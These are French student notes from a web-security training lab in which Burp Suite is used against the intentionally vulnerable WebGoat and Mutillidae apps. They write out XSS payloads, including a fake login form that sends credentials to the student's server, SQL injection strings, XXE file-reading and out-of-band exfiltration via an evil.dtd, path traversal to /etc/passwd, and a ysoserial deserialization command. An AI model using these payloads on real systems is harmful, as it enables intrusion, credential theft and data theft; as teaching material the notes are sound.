#<center>Cyber-Sécurité</center>

## Tips

!!! Ajout de plugins
    Dans Extender il est aisément possible d'ajouter des plugins,  
    Notamment le Déserialiser utile pour le TP #deserialization

##Mise en jambes
Faites de l'analyse de risque pour déterminer si on fait de la sécurité

Qu'est ce qu'une donnée sensible?
Une adresse mail c'est pas forcement sensible
Il faut se référer au GDPR

Les num de carte doivent être sécurisés en toutes circonstances

**Pas de sur-sécurité**

On peut créer des analyses statiques qui vont étudier le code pour examiner les infos en dur dans le logiciel, les librairies, les fonctions etc.

https://networkmarketshare.com

Connexion à: ProxiaAP
mdp: abcdef1234

http://192.168.0.1:8081/WebGoat/attack

Ajouter plug in pour passer par un proxy

Télécharger Burpsuite

##Modes

*Exemple*: 
Original URL: `/search.php?cat_id=§123§&q=§hello§`
Payload: 

###Sniper

Si j'ai défini plusieurs paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.

###Battering ram

Les paramètres vont prendre la même valeur a chaque essai.

###Pitchfork

Si on a 2 paramètres j'ai 2 listes mais ils prennent la même ligne.

###Cluster bomb

Si on a 2 paramètres j'ai 2 listes en faisant toutes les combinaisons.



## TP

### Mise en place
Accéder au Hot-spot Wi-Fi ProxiaAP.
Configurer un proxy (FoxyProxy)
Dans BurpSuite configurer le proxy et setter l'*Intercerpt is off*

Accéder a l'adresse: http://192.168.0.1:8081/WebGoat/attack
et renseigner webgoat et webgoat pour les username et mdp.  

!!! tip
    Pour enlever les requettes non souhaitées dans Burp il faut clic droit sur une requête a garder, add to scope, puis clic sur filter, show only in-scope...

###Cross-Site Scripting

Une fois renseigner le mdp qui est le prénom de l'employé on peut accéder a la barre de recherche.
Dans cette barre de recherche on y rentre un script: `<script>alert(document.cookie);</script>`
Ce script nous permet de renvoyer l'id de la session en cours.

On pourrait aussi renseigner une ligne HTML qui afficherais une image: `<img src="#" onerror="alert('hack');"/>`

Le code suivant permet d'afficher a l'utilisateur qui fait une recherche une erreur et un formulaire. En renseignant son username et son mot de passe l'utilisateur pense se connecter mais on extrait ses identifiants vers notre site web.

```html
Free softwares                    <hr />
<b>Only registered users are allowed to use our search feature to prevent bots</b>
<br></br>
Username:<br><input type="text" name="username"><br>
Password:<br><input type="text" name="password"><br>
<input type="submit" value="Login" 
onclick="window.open('http://http://127.0.0.1:81//?u='+this.form.username.value+'&p='+this.form.password.value);">
```

Pour essayer d'extraire ces données on va commencer par lancer un serveur http avec python `python.exe -m http.server 81`  
!!! Exemple 
    Si on accède maintenant à : http://localhost:81/ on voit sur notre shell une requête:`::ffff:127.0.0.1 - - [23/Oct/2020 09:47:34] "GET / HTTP/1.1" 200 -`  
    Dans la suite on récupérera les identifiants de l'utilisateur leurré via ces requêtes.

### SQL injection
#### Numeric SQL injection

On cherche a récupérer en une seule requête l'ensemble des lignes du tableau.

```yaml
POST /WebGoat/attack?Screen=1767&menu=1200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1767&menu=1200
Cookie: JSESSIONID=811E3CB4496F570511DD69EF18A23D8A
Upgrade-Insecure-Requests: 1

station=101&SUBMIT=Go%21
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  

Dans la requête au dessus, on modifie la dernière ligne:  
`station=101 OR 1=1&SUBMIT=Go%21`.



#### String SQL injection

On a affaire a un formulaire dans lequel on doit renseigner notre nom. On cherche a afficher toutes les lignes de la table user_data.
```yaml
POST /WebGoat/attack?Screen=1758&menu=1200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1758&menu=1200
Cookie: JSESSIONID=811E3CB4496F570511DD69EF18A23D8A
Upgrade-Insecure-Requests: 1

account_name=Your+Name&SUBMIT=Go%21
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  

Dans la requête au dessus, on modifie la dernière ligne:  
`account_name=Your+Name' OR '1'='1&SUBMIT=Go%21`.

Si on retourne sur le site il a chargé, et affiche toute la table

#### Automatisation

On intercepte la requête  
On l'envoi dans l'intruder  
Dans l'onglet *Position* on vient identifier le paramètre a faire changer. On remarque que l'espace a été transformé en un +. Il y a donc un encodage URL.
Il faut ensuite que l'on choisisse le mode d'attaque (Cf. [Modes](#modes)).  
Puis on **Start attack**  
  
#### Blind SQL Injection

On cherche a connaître le nom des tables et des champs.
On sait que la table s'appelle `user_data` et la colonne est `first_name`.
On va chercher par connaître la première lettre du nom. C'est une requête numérique donc on traduit les lettres en code ASCII.
On obtient donc la requête: ` and (select ascii(substring(first_name,§var1§,1)) from user_data where userid=15613)=§var2§`.  

On lance BURP, on intercepte la requête et on la configure dans l'intruder.
On défini les 2 paramètres, on choisi cluster bomb. On défini le premier en nombre de 1 à 5 par pas de 1, puis le second en nombre de 65 à 122 (valeur ASCII) par pas de 1. Enfin dans option on défini le Grep de sorti (*Account number is valid*).  
On lance l'attaque !!


#### XXE

##### Attaque en direct

On souhaites exploiter des erreurs de paramétrage dans les parseurs XML.
Pour se faire on intercepte la requête et on change la partie XML en ce qui suit.
```xml
<<?xml version="1.0"?>
  <!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///">]>
    <comment>
      <text>&rootpath;</text>
    </comment>
```
  
On aura en retour: `.dockerenv bin boot dev docker-java-home etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var `.


Le script suivant permet quant à lui d'exfiltrer ces données en créant une variable ou on stocke les données de secret.txt, puis on affiche cette variable.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM 'file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt'>
%remote;
]>
<comment>
  <text>&cat;</text>
</comment>
```

!!! Recette
    Dans BURP on active l'intercept  
    On clique sur *GO!* (le site va rester en chargement)  
    Dans intercept on cherche la bonne requête, on la modifie  
    On clique sur Forward  
    Sur le site la requête a été exécutée  
    

##### Attaque a l'aide d'un fichier

On upload le fichier attack.dtd via WebWolf.  

attack.dtd:
```xml
<?xml version="1.0" encoding="UTF-8"?>
        <!ENTITY cat SYSTEM 'file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt'>
```

Ici on va cherche le fichier attack.dtd et on viens afficher son contenu
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://192.168.0.1:9090/files/louisonsarlinmagnus/attack.dtd">
%remote;
]>
<comment>
  <text>&cat;</text>
</comment>
```

##### Mulillidae

L'outil du TP: [Mulillidae](http://192.168.0.1/mutillidae/index.php?page=xml-validator.php)  
On souhaite a présent extraire les données vers un site externe.

evil.dtd (placé ici: `http://127.0.0.1:81/evil.dtd`)
```xml
<?xml version="1.0" encoding="utf-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:81'>"> #Serveur auquel envoyé les logs avec les données volées
%all;
```

Script renseigné
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=robots.txt"> #Localisation du fichier a voler
<!ENTITY % dtd SYSTEM "http://127.0.0.1:81/evil.dtd"> #Lien ou stocker le .dtd
%dtd;
]>
<company>
  <employee>
    <firstname>Jo</firstname>
    <lastname>Black</lastname>
  </employee>
  <employee>
    <firstname>John</firstname>
    <lastname>Doe</lastname>
  </employee> 
  <employee>
    <firstname>&send;Bob</firstname>
    <lastname>Smith</lastname>
  </employee>
</company>
```

!!! Explications
    On demande via le XML renseigner de stocker robots.txt (encodé) et de stocké dans file  
    Puis de charger notre script evil.dtd sur un server externe  
    Le script evil demande d'envoyé "un log" sur notre serveur local avec les infos du fichier volé  


### Access Control Flaws

#### Bypass a Path Based Access Control Scheme

Dans cette partie on cherche a trouver des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges.

On cherche a accéder au fichier `etc/passwd`, pour ceci on intercepte la commande et on renseigne le chemin voulu `../../../../../../../../../../../../../../etc/passwd` a la place du fichier.  

#### Role Based Access Control
##### Stage 1: Bypass Business Layer Access Control

En interceptant la requête on remarque un `SearchStaff`, si on le remplace par `DeleteStaff` on supprime notre profil.

```yaml
POST /WebGoat/attack?Screen=1056&menu=200 HTTP/1.1
Host: 192.168.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://192.168.0.1:8081
DNT: 1
Authorization: Basic d2ViZ29hdDp3ZWJnb2F0
Connection: close
Referer: http://192.168.0.1:8081/WebGoat/attack?Screen=1056&menu=200
Cookie: JSESSIONID=6732ED4B0A81C6C42F7B1D4783A051ED
Upgrade-Insecure-Requests: 1

action=DeleteStaff
```

#### Déserialization 

`java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 > webgoat_payload1_touch.txt`

On ouvre un shell dans le dossier LabWebSecu

Ça créer un fichier txt, la ou on est

On copie ce qu'il y a dans le txt dans le site